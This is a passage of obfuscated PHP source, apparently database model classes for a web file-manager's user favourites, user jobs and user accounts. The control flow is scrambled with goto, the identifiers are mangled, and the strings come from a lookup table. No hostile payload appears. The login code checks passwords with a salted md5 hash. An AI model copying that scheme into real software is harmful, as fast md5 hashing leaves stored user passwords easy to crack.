cîì„ÍÆÏ‘; Fƒ‰íˆÌ¿‘: $BÕÔ·´‚„Ú = $this->findWhereField($f¸‰¨’çÆ); if (!$BÕÔ·´‚„Ú) { return parent::save($aæŠñ‚À¦ä, $EÃ—ÈÔƒâ); } $d¼ìµÌÂïÔ = 0; goto AÖœ§Œ£ëæ; cîì„ÍÆÏ‘: return $d¼ìµÌÂïÔ; goto fêÕÎ‹ß„ã; CéºÂÒˆ¬: $c¥·šŸøï³ =& $_SERVER[°Óó£ÌİóèÅ]; $D³¨–áÑÔã = self::SQL_WHERE_IN_CHUNK; $f¸‰¨’çÆ = $this->optionsValue(); goto Fƒ‰íˆÌ¿‘; fêÕÎ‹ß„ã: } public function add($FŞÎ’„ğ = '', $dö·ßØäŞ¼ = array(), $eÇ“÷ÁºŠì = false) { if ($this->addTaskStatus && is_array($FŞÎ’„ğ)) { $this->addTaskData[] = $FŞÎ’„ğ; return; } return parent::add($FŞÎ’„ğ, $dö·ßØäŞ¼, $eÇ“÷ÁºŠì); } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($b¯¤ĞÎÔá¤ = array()) { goto eêÒñÉÄê; Bù†ÊÍö: $B¨å¿ïĞ†¦ = null; for ($C…¬¦Œí‰½ = 0; $C…¬¦Œí‰½ < count($cöÅßáç¨Ğ); $C…¬¦Œí‰½ += $b÷ğâÜÊ«›) { $d“È©“‹‹Ç = array_slice($cöÅßáç¨Ğ, $C…¬¦Œí‰½, $b÷ğâÜÊ«›); if (!is_array($d“È©“‹‹Ç) || count($d“È©“‹‹Ç) == 0) { break; } $e²›ÙãÂ…‹[$AŒÎÄïšò[274]][$cêÕª˜“ì][1] = $d“È©“‹‹Ç; $this->optionsValue($e²›ÙãÂ…‹); $Cåƒ…ãç„¿ = parent::select($b¯¤ĞÎÔá¤); if (!$Cåƒ…ãç„¿) { continue; } if (is_null($B¨å¿ïĞ†¦)) { $B¨å¿ïĞ†¦ = array(); } $B¨å¿ïĞ†¦ = array_merge($B¨å¿ïĞ†¦, $Cåƒ…ãç„¿); } return $B¨å¿ïĞ†¦; goto bõ˜µÕß; eêÒñÉÄê: $AŒÎÄïšò =& $_SERVER[°Óó£ÌİóèÅ]; $b÷ğâÜÊ«› = self::SQL_WHERE_IN_CHUNK; $e²›ÙãÂ…‹ = $this->optionsValue(); goto AÁÜÂ²‡£•; AÁÜÂ²‡£•: $cêÕª˜“ì = $this->findWhereField($e²›ÙãÂ…‹); if (!$cêÕª˜“ì || isset($e²›ÙãÂ…‹[$AŒÎÄïšò[291]]) || isset($e²›ÙãÂ…‹[$AŒÎÄïšò[350]])) { return parent::select($b¯¤ĞÎÔá¤); } $cöÅßáç¨Ğ = $e²›ÙãÂ…‹[$AŒÎÄïšò[274]][$cêÕª˜“ì][1]; goto Bù†ÊÍö; bõ˜µÕß: } public function delete($B£ö»˜­Œ¢ = array()) { goto bæòÄê­³ë; bæòÄê­³ë: $d§ŞŠÒäô =& $_SERVER[°Óó£ÌİóèÅ]; $bÇâº•É·§ = self::SQL_WHERE_IN_CHUNK; $bÓŞ ¨³«Å = $this->optionsValue(); goto dÜË§Ÿ•ÎŒ; dÜË§Ÿ•ÎŒ: $cœŸÆ£ØÃÃ = $this->findWhereField($bÓŞ ¨³«Å); if (!$cœŸÆ£ØÃÃ) { return parent::delete($B£ö»˜­Œ¢); } $b»£ƒ÷ª¾ = 0; goto c†Ë×ˆóé¬; c†Ë×ˆóé¬: $b«é’‚·²¸ = $bÓŞ ¨³«Å[$d§ŞŠÒäô[274]][$cœŸÆ£ØÃÃ][1]; for ($Eœäï„ï” = 0; $Eœäï„ï” < count($b«é’‚·²¸); $Eœäï„ï” += $bÇâº•É·§) { $D²‹ªÊğÃ = array_slice($b«é’‚·²¸, $Eœäï„ï”, $bÇâº•É·§); if (!is_array($D²‹ªÊğÃ) || count($D²‹ªÊğÃ) == 0) { break; } $bÓŞ ¨³«Å[$d§ŞŠÒäô[274]][$cœŸÆ£ØÃÃ][1] = $D²‹ªÊğÃ; $this->optionsValue($bÓŞ ¨³«Å); $b»£ƒ÷ª¾ += parent::delete($B£ö»˜­Œ¢); } return $b»£ƒ÷ª¾; goto AòğÒù™Á; AòğÒù™Á: } private function findWhereField($e”‹è¨ÓÍ) { $Bñ±£Úù¶œ =& $_SERVER[°Óó£ÌİóèÅ]; $Cƒ÷‘Á§Àˆ = self::SQL_WHERE_IN_CHUNK; if (!is_array($e”‹è¨ÓÍ) || !is_array($e”‹è¨ÓÍ[$Bñ±£Úù¶œ[274]])) { return !1; } foreach ($e”‹è¨ÓÍ[$Bñ±£Úù¶œ[274]] as $aæ‹ïÎ«ìœ => $eÇçä›ÈòÂ) { if (is_array($eÇçä›ÈòÂ) && isset($eÇçä›ÈòÂ[0]) && is_string($eÇçä›ÈòÂ[0]) && strtolower($eÇçä›ÈòÂ[0]) == $Bñ±£Úù¶œ[7] && is_array($eÇçä›ÈòÂ[1]) && count($eÇçä›ÈòÂ[1]) > $Cƒ÷‘Á§Àˆ) { ignore_timeout(); return $aæ‹ïÎ«ìœ; } } return !1; } } goto bôÅ—ìĞÒ¼; DØ›ÖƒÓñ¦: class UserFavModel extends ModelBase { protected $tableName = "\165\x73\145\162\x5f\x66\x61\x76"; protected function cacheFunctionAlias($D¶‹ä­ƒ¹–) { $d³¶†²ß°“ =& $_SERVER[°Óó£ÌİóèÅ]; return array($d³¶†²ß°“[1909] => array(USER_ID, $d³¶†²ß°“[1910])); } protected function listData() { $C„ò©›”µÙ =& $_SERVER[°Óó£ÌİóèÅ]; $aàå§â‰Å = array($C„ò©›”µÙ[1086] => USER_ID, $C„ò©›”µÙ[1911] => 0); $cîã½ù“· = $C„ò©›”µÙ[1912]; $c¡…²¯­ç¶ = $this->field($cîã½ù“·)->where($aàå§â‰Å)->order($C„ò©›”µÙ[1913])->select(); return $c¡…²¯­ç¶ ? $c¡…²¯­ç¶ : array(); } protected function resetCache() { } protected function listView() { goto Aí—ƒİ­á; Aí—ƒİ­á: $C­ò Ğ¨× =& $_SERVER[°Óó£ÌİóèÅ]; $AãäÙ¯ƒì = $this->listData(); $a…ÄË¼’Å‚ = array_filter_by_field($AãäÙ¯ƒì, $C­ò Ğ¨×[29], $C­ò Ğ¨×[983]); goto b­í³â‡óÁ; bÄ¼Ä°¬ùé: $béáÒóÙ Ø = array($C­ò Ğ¨×[423] => array($C­ò Ğ¨×[563], $cğ‚Ï´ò’‹)); $fà§¥“œá = Model($C­ò Ğ¨×[529])->listSource($béáÒóÙ Ø, $f¬„äŠ¾Ã); $fà§¥“œá = array_merge($fà§¥“œá[$C­ò Ğ¨×[82]], $fà§¥“œá[$C­ò Ğ¨×[83]]); goto B¸ö·ğ±Û„; b­í³â‡óÁ: $cğ‚Ï´ò’‹ = array_to_keyvalue($a…ÄË¼’Å‚, $C­ò Ğ¨×[33], $C­ò Ğ¨×[84]); if (!$cğ‚Ï´ò’‹) { return $AãäÙ¯ƒì; } $f¬„äŠ¾Ã = 2000; goto bÄ¼Ä°¬ùé; B¸ö·ğ±Û„: $fà§¥“œá = array_to_keyvalue($fà§¥“œá, $C­ò Ğ¨×[382]); foreach ($AãäÙ¯ƒì as $câ·ƒ½ìÙé => $dåŒ†àä²í) { $cÅŸÍ·ÆÇù = $fà§¥“œá[$dåŒ†àä²í[$C­ò Ğ¨×[84]]]; $cÅŸÍ·ÆÇù = $cÅŸÍ·ÆÇù ? $cÅŸÍ·ÆÇù : array(); $AãäÙ¯ƒì[$câ·ƒ½ìÙé] = array_merge($cÅŸÍ·ÆÇù, $dåŒ†àä²í); } return $AãäÙ¯ƒì; goto FùÁ­“êÆÔ; FùÁ­“êÆÔ: } protected function addFav($dŞ¸¥šÅé”, $DŞ‘çœ‘©å = '', $Aâ’—ÄÊÓï = "\x73\157\x75\x72\143\145") { goto B±˜‰ÁÃİ÷; C™ŒÖ¤Æ÷ó: if (!$DŞ‘çœ‘©å && $Aâ’—ÄÊÓï == $A¥’‹ïîĞ[983]) { $bòË­ŠóÒ = Model($A¥’‹ïîĞ[852])->where(array($A¥’‹ïîĞ[423] => $dŞ¸¥šÅé”))->find(); if (!$bòË­ŠóÒ) { return !1; } $DŞ‘çœ‘©å = $bòË­ŠóÒ[$A¥’‹ïîĞ[28]]; } $DŞ‘çœ‘©å = $this->getAutoName($DŞ‘çœ‘©å); $DÍ„Ïˆ…å = array($A¥’‹ïîĞ[1086] => USER_ID, $A¥’‹ïîĞ[1911] => 0, $A¥’‹ïîĞ[395] => $DŞ‘çœ‘©å, $A¥’‹ïîĞ[1608] => $dŞ¸¥šÅé”, $A¥’‹ïîĞ[812] => $Aâ’—ÄÊÓï, $A¥’‹ïîĞ[1550] => $C‰â–É¥¿é + 1); goto a¿ÄÉ˜·; bàÏ®ôÇÏÓ: $Aõˆ£Ÿ©¨ = array($A¥’‹ïîĞ[1086] => USER_ID, $A¥’‹ïîĞ[1911] => 0); $C‰â–É¥¿é = $this->where($Aõˆ£Ÿ©¨)->max($A¥’‹ïîĞ[1567]); if (!$C‰â–É¥¿é) { $C‰â–É¥¿é = 0; } goto C™ŒÖ¤Æ÷ó; a¿ÄÉ˜·: return $this->add($DÍ„Ïˆ…å); goto BÜØˆÛ–ÚØ; B±˜‰ÁÃİ÷: $A¥’‹ïîĞ =& $_SERVER[°Óó£ÌİóèÅ]; $Aõˆ£Ÿ©¨ = array($A¥’‹ïîĞ[1086] => USER_ID, $A¥’‹ïîĞ[1911] => 0, $A¥’‹ïîĞ[812] => $Aâ’—ÄÊÓï, $A¥’‹ïîĞ[1608] => $dŞ¸¥šÅé”); if ($this->where($Aõˆ£Ÿ©¨)->find()) { return !1; } goto bàÏ®ôÇÏÓ; BÜØˆÛ–ÚØ: } protected function remove($fÚ¹ğ²äÍ¹) { $a·‹Ûù­˜À =& $_SERVER[°Óó£ÌİóèÅ]; $B¹´¥‘‹‰” = array($a·‹Ûù­˜À[1086] => USER_ID, $a·‹Ûù­˜À[814] => $fÚ¹ğ²äÍ¹); return $this->where($B¹´¥‘‹‰”)->delete(); } protected function removeByName($aÅƒªßŒ¤œ) { $E×»óß½§£ =& $_SERVER[°Óó£ÌİóèÅ]; $D…±ë›ÅÜÒ = array($E×»óß½§£[1086] => USER_ID, $E×»óß½§£[395] => $aÅƒªßŒ¤œ, $E×»óß½§£[1911] => 0); return $this->where($D…±ë›ÅÜÒ)->delete(); } protected function rename($c„Æê£Œˆ‰, $bºª¨éô÷ ) { $cÅÉç´¹ÍÌ =& $_SERVER[°Óó£ÌİóèÅ]; if ($c„Æê£Œˆ‰ == $bºª¨éô÷ ) { return !1; } $aÉˆ¤‡¬òÂ = $this->getAutoName($bºª¨éô÷ ); if ($bºª¨éô÷  != $aÉˆ¤‡¬òÂ) { return !1; } $BîÓ–œ¨± = array($cÅÉç´¹ÍÌ[1086] => USER_ID, $cÅÉç´¹ÍÌ[1911] => 0, $cÅÉç´¹ÍÌ[28] => $c„Æê£Œˆ‰); return $this->where($BîÓ–œ¨±)->save(array($cÅÉç´¹ÍÌ[28] => $bºª¨éô÷ )); } protected function resetSort($B§Ü¨ù¢Ó) { $b®êõºŠ×º =& $_SERVER[°Óó£ÌİóèÅ]; $EöÓ‘…Ğİ = array($b®êõºŠ×º[1086] => USER_ID); for ($c±Šà»·Ëï = 0; $c±Šà»·Ëï < count($B§Ü¨ù¢Ó); $c±Šà»·Ëï++) { $EöÓ‘…Ğİ[$b®êõºŠ×º[814]] = $B§Ü¨ù¢Ó[$c±Šà»·Ëï]; $this->where($EöÓ‘…Ğİ)->save(array($b®êõºŠ×º[1550] => $c±Šà»·Ëï + 1)); } return !0; } protected function moveTop($f—ÑµæĞ¿Ü) { goto BŒçìÑÃ©ˆ; D×Ë’¥ëŒØ: $BèãÄ¯ÄÊ = $a±Éô®ğ‰î; $a±Éô®ğ‰î = array_remove_value($a±Éô®ğ‰î, $F•»Œë©‘[$Cããõİ«œ[376]]); array_unshift($a±Éô®ğ‰î, $F•»Œë©‘[$Cããõİ«œ[376]]); goto a††¯³¢Ë¨; BŒçìÑÃ©ˆ: $Cããõİ«œ =& $_SERVER[°Óó£ÌİóèÅ]; $e¬…ßöãù = array($Cããõİ«œ[1086] => USER_ID, $Cããõİ«œ[1911] => 0); $F•»Œë©‘ = $this->where($e¬…ßöãù)->where(array($Cããõİ«œ[28] => $f—ÑµæĞ¿Ü))->find(); goto A„¯ØÅ ‡; a††¯³¢Ë¨: return $this->resetSort($a±Éô®ğ‰î); goto A …šÁ®Ö; A„¯ØÅ ‡: if (!$F•»Œë©‘) { return; } $a±Éô®ğ‰î = $this->field($Cããõİ«œ[376])->where($e¬…ßöãù)->order($Cããõİ«œ[1913])->select(); $a±Éô®ğ‰î = array_to_keyvalue($a±Éô®ğ‰î, $Cããõİ«œ[33], $Cããõİ«œ[376]); goto D×Ë’¥ëŒØ; A …šÁ®Ö: } protected function moveBottom($E³¯ŸÇ÷„›) { $A÷¼é•æˆÑ =& $_SERVER[°Óó£ÌİóèÅ]; $C“„Ûä¢‘Ï = array($A÷¼é•æˆÑ[1086] => USER_ID, $A÷¼é•æˆÑ[1911] => 0); $CÓˆ±½¢â³ = $this->where($C“„Ûä¢‘Ï)->max($A÷¼é•æˆÑ[1567]); $D±©¹ôŒÚ = array($A÷¼é•æˆÑ[1567] => $CÓˆ±½¢â³ + 1); return $this->where($C“„Ûä¢‘Ï)->where(array($A÷¼é•æˆÑ[28] => $E³¯ŸÇ÷„›))->save($D±©¹ôŒÚ); } private function getAutoName($DõÑãÅ£Ûˆ) { goto CµÊ‡ŠÀöß; D£ğ³Ñ±©: $cÓŸí‡óÎ = array_to_keyvalue($cÓŸí‡óÎ, $BçˆÛğÉ©¹[33], $BçˆÛğÉ©¹[28]); if (!$cÓŸí‡óÎ || !in_array($DõÑãÅ£Ûˆ, $cÓŸí‡óÎ)) { return $DõÑãÅ£Ûˆ; } for ($e‹˜£ëÒÌ• = 0; $e‹˜£ëÒÌ• < count($cÓŸí‡óÎ); $e‹˜£ëÒÌ•++) { if (!in_array($DõÑãÅ£Ûˆ . "\x28{$e‹˜£ëÒÌ•}\51", $cÓŸí‡óÎ)) { return $DõÑãÅ£Ûˆ . "\x28{$e‹˜£ëÒÌ•}\x29"; } } goto cïºççùÒ„; CµÊ‡ŠÀöß: $BçˆÛğÉ©¹ =& $_SERVER[°Óó£ÌİóèÅ]; $dˆÌ¨©ù‚ = array($BçˆÛğÉ©¹[1086] => USER_ID, $BçˆÛğÉ©¹[1911] => 0); $cÓŸí‡óÎ = $this->field($BçˆÛğÉ©¹[28])->where($dˆÌ¨©ù‚)->select(); goto D£ğ³Ñ±©; cïºççùÒ„: return $DõÑãÅ£Ûˆ . "\x28{$e‹˜£ëÒÌ•}\x29"; goto c¸á¥ÑøàÅ; c¸á¥ÑøàÅ: } } class UserJobModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\x65\155\x2e\152\157\x62\114\x69\x73\x74"; public $field = array("\156\141\x6d\x65", "\144\145\163\x63", "\x73\x6f\162\x74"); const JOB_KEY = "\x73\x65\154\146\112\x6f\142\x4c\151\x73\164"; public function listData($f¼ƒÊƒ„ò = false, $a½—®ø² = "\163\x6f\162\x74", $BÚ¯Ş¸ŠŒ = false) { return parent::listData($f¼ƒÊƒ„ò, $a½—®ø², $BÚ¯Ş¸ŠŒ); } public function remove($Bø—ã³é»¯) { return parent::remove($Bø—ã³é»¯); } public function add($d¦îğ©á¾Ó) { $B˜Îºëï¢ø =& $_SERVER[°Óó£ÌİóèÅ]; if ($this->findByName($d¦îğ©á¾Ó[$B˜Îºëï¢ø[28]])) { return !1; } $d¦îğ©á¾Ó[$B˜Îºëï¢ø[1567]] = $this->getSort(); return parent::insert($d¦îğ©á¾Ó); } private function getSort() { $b°¬ˆÏ‹Ğ =& $_SERVER[°Óó£ÌİóèÅ]; $eŞÌÔ£Æõè = parent::listData(); $f¯ä‚´‰„ = array_to_keyvalue($eŞÌÔ£Æõè, $b°¬ˆÏ‹Ğ[33], $b°¬ˆÏ‹Ğ[1567]); return empty($f¯ä‚´‰„) ? 0 : max($f¯ä‚´‰„) + 1; } public function update($Cöê¢²ó»ø, $Dø†¬×‚‰×) { $dÕªªˆóÏ =& $_SERVER[°Óó£ÌİóèÅ]; $aË›÷éÀ· = parent::listData($Cöê¢²ó»ø); $eÆ°¡‚Úµ = $this->findByName($Dø†¬×‚‰×[$dÕªªˆóÏ[28]]); if (!$aË›÷éÀ· || $eÆ°¡‚Úµ && $eÆ°¡‚Úµ[$dÕªªˆóÏ[376]] != $aË›÷éÀ·[$dÕªªˆóÏ[376]]) { return !1; } return parent::update($Cöê¢²ó»ø, $Dø†¬×‚‰×); } public function setUserJob($fÛñƒÂÚ¥³, $c±Çà¶´òÏ) { goto c—µŸõ»õ‘; c—µŸõ»õ‘: $aîƒ˜ô¡Şµ =& $_SERVER[°Óó£ÌİóèÅ]; if (!is_array($c±Çà¶´òÏ)) { $c±Çà¶´òÏ = array($c±Çà¶´òÏ); } $dìŞà•‚ô = parent::listData(); goto aìŠÛÓŸ–; DÖ’ÖÅ‚†ˆ: $Eğï¾Ö„³ = rtrim($Eğï¾Ö„³, $aîƒ˜ô¡Şµ[47]); Model($aîƒ˜ô¡Şµ[1481])->metaSet($fÛñƒÂÚ¥³, self::JOB_KEY, $Eğï¾Ö„³); goto EÖÈõ”øŞÔ; aìŠÛÓŸ–: $F¼ÖÓÄÔÏ = array_to_keyvalue($dìŞà•‚ô, $aîƒ˜ô¡Şµ[28]); $Eğï¾Ö„³ = $aîƒ˜ô¡Şµ[371]; foreach ($c±Çà¶´òÏ as $DïŠ«°°Ä) { if ($F¼ÖÓÄÔÏ[$DïŠ«°°Ä]) { $Eğï¾Ö„³ .= $F¼ÖÓÄÔÏ[$DïŠ«°°Ä][$aîƒ˜ô¡Şµ[376]] . $aîƒ˜ô¡Şµ[47]; } else { $e”ÑÜ²Ö· = $this->add($DïŠ«°°Ä); $Eğï¾Ö„³ .= $e”ÑÜ²Ö· . $aîƒ˜ô¡Şµ[47]; } } goto DÖ’ÖÅ‚†ˆ; EÖÈõ”øŞÔ: } public function getUserJob($Eë³¼ÉÓÓ´) { $CÍí‡­â± = Model($_SERVER[°Óó£ÌİóèÅ][1481])->metaGet($Eë³¼ÉÓÓ´); return $this->getUserJobInfo($CÍí‡­â±[self::JOB_KEY]); } public function getUserJobInfo($aŞëÂ–ç¼î) { goto A÷×Ë±á¸å; FÆ±¶¸­šã: return $d¹‡…ƒİ; goto A¬Á÷†´³Ó; c¶”˜©ˆ•é: $Aïçã‹í×à = array_remove_key($Aïçã‹í×à, $bÜñ‘‰Õ˜‘[195]); $d¹‡…ƒİ = array(); foreach ($bèË£îÌ•Î as $A’ßø¾Ö…) { if (isset($Aïçã‹í×à[$A’ßø¾Ö…])) { $d¹‡…ƒİ[] = $Aïçã‹í×à[$A’ßø¾Ö…]; } } goto FÆ±¶¸­šã; A÷×Ë±á¸å: $bÜñ‘‰Õ˜‘ =& $_SERVER[°Óó£ÌİóèÅ]; $bèË£îÌ•Î = explode($bÜñ‘‰Õ˜‘[47], $aŞëÂ–ç¼î); $Aïçã‹í×à = parent::listData(); goto c¶”˜©ˆ•é; A¬Á÷†´³Ó: } } class UserModel extends ModelBase { protected $tableName = "\x75\163\145\x72"; protected $tableMeta = array("\x74\141\142\x6c\x65\x4e\x61\155\145" => "\x75\163\145\162\137\155\x65\164\x61", "\x6d\145\164\141\106\x69\145\x6c\x64" => "\165\163\x65\162\x49\x44"); protected $simpleField = "\165\163\145\162\111\x44\54\x6e\151\x63\x6b\x4e\141\x6d\145\54\156\x61\x6d\x65\x2c\141\x76\141\164\141\162\54\x73\x65\170"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($BÔÓ»ª¤İ¬) { $aØ•¼‰×é’ =& $_SERVER[°Óó£ÌİóèÅ]; return array($aØ•¼‰×é’[1622] => array($BÔÓ»ª¤İ¬[0], $aØ•¼‰×é’[1914]), $aØ•¼‰×é’[1624] => array($BÔÓ»ª¤İ¬[0], $aØ•¼‰×é’[1914])); } protected function getInfo($bÎó¥©å”‘, $B¼ø×‘ñÏ§ = false) { $b“¢ØâŞÁÃ =& $_SERVER[°Óó£ÌİóèÅ]; $CÑÉÂÕõ÷ = $this->getInfoSimple($bÎó¥©å”‘); if (!is_array($CÑÉÂÕõ÷)) { return array(); } if ($B¼ø×‘ñÏ§) { goto e¸Æ¬ÂÔ­‘; EáÆÏàåÙ: $B’È²¿Êë’ = Model($b“¢ØâŞÁÃ[852])->metaGet($CÑÉÂÕõ÷[$b“¢ØâŞÁÃ[858]][$b“¢ØâŞÁÃ[382]]); $CÑÉÂÕõ÷[$b“¢ØâŞÁÃ[1917]] = $CÃ¤¸¢÷š; $CÑÉÂÕõ÷[$b“¢ØâŞÁÃ[858]][$b“¢ØâŞÁÃ[1763]] = isset($B’È²¿Êë’[$b“¢ØâŞÁÃ[1764]]) ? $B’È²¿Êë’[$b“¢ØâŞÁÃ[1764]] : null; goto C»ÌÃß¤ì; C»ÌÃß¤ì: return $CÑÉÂÕõ÷; goto bÛ«¹‰Ù×¤; e¸Æ¬ÂÔ­‘: if (!$CÑÉÂÕõ÷) { return $CÑÉÂÕõ÷; } $CÃ¤¸¢÷š = md5($b“¢ØâŞÁÃ[1915] . $CÑÉÂÕõ÷[$b“¢ØâŞÁÃ[568]] . $b“¢ØâŞÁÃ[1916] . $CÑÉÂÕõ÷[$b“¢ØâŞÁÃ[28]]); $CÑÉÂÕõ÷ = $this->_listDataApplyItem($CÑÉÂÕõ÷); goto EáÆÏàåÙ; bÛ«¹‰Ù×¤: } return $this->cacheFunctionGet($b“¢ØâŞÁÃ[1660], $bÎó¥©å”‘); } protected function getInfoSimple($fÄ¬ÈíĞª, $bññ²öùî‹ = false) { $BƒÅ³¢ˆùİ =& $_SERVER[°Óó£ÌİóèÅ]; if (!$fÄ¬ÈíĞª) { return array(); } if ($bññ²öùî‹) { $EŸëÍø¸‘ª = $this->where(array($BƒÅ³¢ˆùİ[1095] => intval($fÄ¬ÈíĞª)))->find(); if (!is_array($EŸëÍø¸‘ª)) { return array(); } $EŸëÍø¸‘ª[$BƒÅ³¢ˆùİ[1918]] = Action($BƒÅ³¢ˆùİ[1919])->parseUrl($EŸëÍø¸‘ª[$BƒÅ³¢ˆùİ[1918]]); return $EŸëÍø¸‘ª; } return $this->cacheFunctionGet($BƒÅ³¢ˆùİ[1625], $fÄ¬ÈíĞª); } protected function getInfoSimpleOuter($F¯¶¾•™›†) { goto BˆÄ†‹•ñ…; BˆÄ†‹•ñ…: $eìÚ§ÊÁ½„ =& $_SERVER[°Óó£ÌİóèÅ]; if (!$F¯¶¾•™›† || $F¯¶¾•™›† == 0) { return array($eìÚ§ÊÁ½„[1095] => $eìÚ§ÊÁ½„[410], $eìÚ§ÊÁ½„[28] => $eìÚ§ÊÁ½„[162] . LNG($eìÚ§ÊÁ½„[1920]) . $eìÚ§ÊÁ½„[523], $eìÚ§ÊÁ½„[1918] => STATIC_PATH . $eìÚ§ÊÁ½„[1921]); } $d³ì×æ°Ë = $this->cacheFunctionGet($eìÚ§ÊÁ½„[1625], $F¯¶¾•™›†); goto eé«Ò†ç®; eé«Ò†ç®: $cŸ´¡®ìßá = array_field_key($d³ì×æ°Ë, explode($eìÚ§ÊÁ½„[47], $this->simpleField)); if (!$cŸ´¡®ìßá) { return array($eìÚ§ÊÁ½„[1095] => $eìÚ§ÊÁ½„[780], $eìÚ§ÊÁ½„[28] => $eìÚ§ÊÁ½„[162] . LNG($eìÚ§ÊÁ½„[1922]) . $eìÚ§ÊÁ½„[523], $eìÚ§ÊÁ½„[1918] => STATIC_PATH . $eìÚ§ÊÁ½„[1923]); } $cŸ´¡®ìßá[$eìÚ§ÊÁ½„[1918]] = Action($eìÚ§ÊÁ½„[1919])->parseUrl($cŸ´¡®ìßá[$eìÚ§ÊÁ½„[1918]]); goto aè…×Š¦Ù„; aè…×Š¦Ù„: return $cŸ´¡®ìßá; goto dêôÅê®ší; dêôÅê®ší: } protected function groupUser($f©ŠÂÑĞ¿á) { } public static function errorLang($D†ÆÁª¤İé) { $Cß„¢øÈ¾ =& $_SERVER[°Óó£ÌİóèÅ]; $E˜Õ‹è²Âš = array(self::ERROR_USER_NOT_EXISTS => $Cß„¢øÈ¾[1924], self::ERROR_USER_PASSWORD_ERROR => $Cß„¢øÈ¾[1925], self::ERROR_USER_EXIST_NAME => $Cß„¢øÈ¾[1926], self::ERROR_USER_EXIST_PHONE => $Cß„¢øÈ¾[1927], self::ERROR_USER_EXIST_EMAIL => $Cß„¢øÈ¾[1928], self::ERROR_USER_LOGIN_LOCK => $Cß„¢øÈ¾[1929], self::ERROR_IP_NOT_ALLOW => $Cß„¢øÈ¾[1930], self::ERROR_USER_EXIST_NICKNAME => $Cß„¢øÈ¾[1931]); return LNG($E˜Õ‹è²Âš[$D†ÆÁª¤İé]); } public function getInfoByMeta($a¡ğòÕ¹Œ˜, $aï‹ì÷½’·) { $bÉóšÏïè =& $_SERVER[°Óó£ÌİóèÅ]; $aÑªª¸¿´ = Model($bÉóšÏïè[1932])->where(array($bÉóšÏïè[96] => $a¡ğòÕ¹Œ˜, $bÉóšÏïè[367] => $aï‹ì÷½’·))->find(); if ($aÑªª¸¿´) { return $this->getInfo($aÑªª¸¿´[$bÉóšÏïè[1095]]); } return !1; } public function userLoginCheck($aœ¹ÂÔ©, $a¢Šˆ×‡‹Ô) { goto CÈ÷¼Å…˜; CÈ÷¼Å…˜: $cƒŠó‚Ë˜ù =& $_SERVER[°Óó£ÌİóèÅ]; $AÊĞøğ“¥‰ = array($cƒŠó‚Ë˜ù[28] => $aœ¹ÂÔ©, $cƒŠó‚Ë˜ù[1770] => $aœ¹ÂÔ©, $cƒŠó‚Ë˜ù[304] => $aœ¹ÂÔ©, $cƒŠó‚Ë˜ù[1933] => $aœ¹ÂÔ©, $cƒŠó‚Ë˜ù[681] => $cƒŠó‚Ë˜ù[683]); if ($this->nickNameRpt()) { unset($AÊĞøğ“¥‰[$cƒŠó‚Ë˜ù[1770]]); } goto eß‹‚å ÓÛ; eß‹‚å ÓÛ: $B¶ß“†ÅÄ = $this->where($AÊĞøğ“¥‰)->find(); if (!$B¶ß“†ÅÄ) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($B¶ß“†ÅÄ[$cƒŠó‚Ë˜ù[1095]], $a¢Šˆ×‡‹Ô)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } goto B‹éŒë§; B‹éŒë§: $this->userEdit($B¶ß“†ÅÄ[$cƒŠó‚Ë˜ù[1095]], array($cƒŠó‚Ë˜ù[1934] => time())); $this->clearCache($B¶ß“†ÅÄ[$cƒŠó‚Ë˜ù[1095]]); return $this->getInfo($B¶ß“†ÅÄ[$cƒŠó‚Ë˜ù[1095]]); goto E™ÒÙÄï¾; E™ÒÙÄï¾: } private function clearCache($A«³ùÌô¼‚) { $dÜÂµ××ó =& $_SERVER[°Óó£ÌİóèÅ]; $this->cacheFunctionClear($dÜÂµ××ó[1660], $A«³ùÌô¼‚); $this->cacheFunctionClear($dÜÂµ××ó[1625], $A«³ùÌô¼‚); } public function userPasswordCheck($eë½¾Ìáî£, $DÙÊ©‡©ŸÌ) { $Dõ´¥­™² =& $_SERVER[°Óó£ÌİóèÅ]; $BƒÑ’³ŒõÎ = $this->where(array($Dõ´¥­™²[1095] => intval($eë½¾Ìáî£)))->find(); $f©ÅÛÎÒ¿¯ = $this->metaGet($eë½¾Ìáî£); $B´á‚ùîô = isset($f©ÅÛÎÒ¿¯[$Dõ´¥­™²[1935]]) ? $f©ÅÛÎÒ¿¯[$Dõ´¥­™²[1935]] : $Dõ´¥­™²[33]; if (md5($B´á‚ùîô . trim($DÙÊ©‡©ŸÌ)) !== $BƒÑ’³ŒõÎ[$Dõ´¥­™²[568]]) { return !1; } return !0; } public function userAdd($EÃ¾ÅĞä…×) { goto D¬²£×İ¥Œ; d…í¿ñäÑØ: return $f“Ú‹ÍÖÌ×; goto E“›Ù˜¾“; cëÛĞ±¡¡·: $DÏ¯‡³ÁËö = $this->_checkExist($EÃ¾ÅĞä…×); if ($DÏ¯‡³ÁËö !== !0) { return $DÏ¯‡³ÁËö; } $f“Ú‹ÍÖÌ× = $this->add($C¢Ì†çòÚ); goto AøÖóå‰†; AøÖóå‰†: $aËÓ¾ŒØó„ = array($Eå‘Õ±ÑÈÑ[1944] => $C¢Ì†çòÚ[$Eå‘Õ±ÑÈÑ[568]], $Eå‘Õ±ÑÈÑ[1940] => $C¢Ì†çòÚ[$Eå‘Õ±ÑÈÑ[1770]]); $this->userEdit($f“Ú‹ÍÖÌ×, $aËÓ¾ŒØó„); Model($Eå‘Õ±ÑÈÑ[852])->userRootAdd($f“Ú‹ÍÖÌ×); goto d…í¿ñäÑØ; D¬²£×İ¥Œ: $Eå‘Õ±ÑÈÑ =& $_SERVER[°Óó£ÌİóèÅ]; $C¢Ì†çòÚ = array($Eå‘Õ±ÑÈÑ[395] => $EÃ¾ÅĞä…×[$Eå‘Õ±ÑÈÑ[28]], 